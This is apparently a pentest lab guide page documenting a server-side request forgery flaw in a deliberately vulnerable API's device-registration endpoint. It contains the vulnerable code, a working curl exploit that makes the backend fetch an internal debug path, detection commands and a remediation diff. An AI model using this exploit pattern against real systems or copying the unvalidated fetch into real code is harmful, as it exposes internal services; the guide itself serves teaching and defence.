# API7 — Server Side Request Forgery (SSRF) · VulnMNO Pentest Guide

> **Status: live — implemented and verified.** The exploitation steps below
> were run against a live instance and the outputs shown are real.

OWASP API Security reference: **API7:2023 — Server Side Request Forgery.**

## Where it lives

- **Endpoint:** `POST /api/auth/devices` · body includes `callbackUrl`
- **Schema:** `app/schemas/auth.py::DeviceRegisterRequest`
- **Code:** `app/routers/auth.py::register_device`

```python
if body.callbackUrl:
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            await client.get(body.callbackUrl)
    except httpx.HTTPError:
        pass
```

## Why it is API7

`callbackUrl` is customer-supplied and fed directly into a server-side
`httpx.get(...)` call with no scheme allowlist, no hostname allowlist, and no
block on private/loopback/link-local address ranges. The backend will fetch
whatever URL it's handed, from its own network position — including its own
loopback interface and (in the full Docker Compose stack) internal-only
services like `db` and `provisioning-mock` that aren't otherwise reachable
from outside the container network.

## How to find it (static analysis)

```bash
grep -n "httpx\." src/backend/app/routers/*.py
```

Every legitimate outbound call in this codebase lives in `app/gateways/`;
an `httpx` call directly inside a router (`auth.py`) is the anomaly.

## Verified exploitation (actual run)

```bash
curl -s -X POST http://localhost:8000/api/auth/devices \
  -H "Authorization: Bearer $TOKEN_CUST1" -H 'Content-Type: application/json' \
  -d '{"deviceId":"ssrf-probe-device-01","platform":"android",
       "callbackUrl":"http://127.0.0.1:8000/api/customers/_debug/CUST-10001"}'
```

Response: `200 {"deviceId":"ssrf-probe-device-01","recognized":false,...}` —
looks like an ordinary device registration from the outside.

The backend's own access log tells the real story:

```
INFO:     127.0.0.1:50734 - "GET /api/customers/_debug/CUST-10001 HTTP/1.1" 200 OK
```

That request was never made by the curl client — the client's IP as seen by
the backend was the Docker bridge address, not `127.0.0.1`. This line is the
**backend process itself** issuing the GET, proving the server-side fetch
fired with the exact attacker-supplied URL, including one that reaches an
otherwise-exposed-but-still-illustrative internal path (chained here to the
API9 debug endpoint, but the same mechanism reaches anything on the
backend's network — a private service, a cloud metadata endpoint, another
container).

## Blue-team detection

```bash
# Outbound connections from the backend container to unexpected hosts
docker exec docker-backend-1 sh -c "netstat -tn | grep -v ':5432\|:8000'"
```

At the app layer: log every `callbackUrl` at registration time and alert on
private/loopback/link-local literals (`127.*`, `10.*`, `172.16-31.*`,
`192.168.*`, `169.254.*`) or non-HTTPS schemes.

## Remediation diff

```diff
+ALLOWED_SCHEMES = {"https"}
+def _is_safe_callback_url(url: str) -> bool:
+    parsed = urlparse(url)
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        return False
+    ip = socket.gethostbyname(parsed.hostname)
+    return ipaddress.ip_address(ip).is_global
+
 if body.callbackUrl:
+    if not _is_safe_callback_url(body.callbackUrl):
+        raise AppError(ErrorCode.VALIDATION_FAILED, "Invalid callback URL", http_status=400)
     try:
         async with httpx.AsyncClient(timeout=3.0) as client:
             await client.get(body.callbackUrl)
     except httpx.HTTPError:
         pass
```

Real-world fix also drops server-side "verification pings" in favor of a
signed-challenge callback pattern, but the allowlist above is enough to close
the lab.
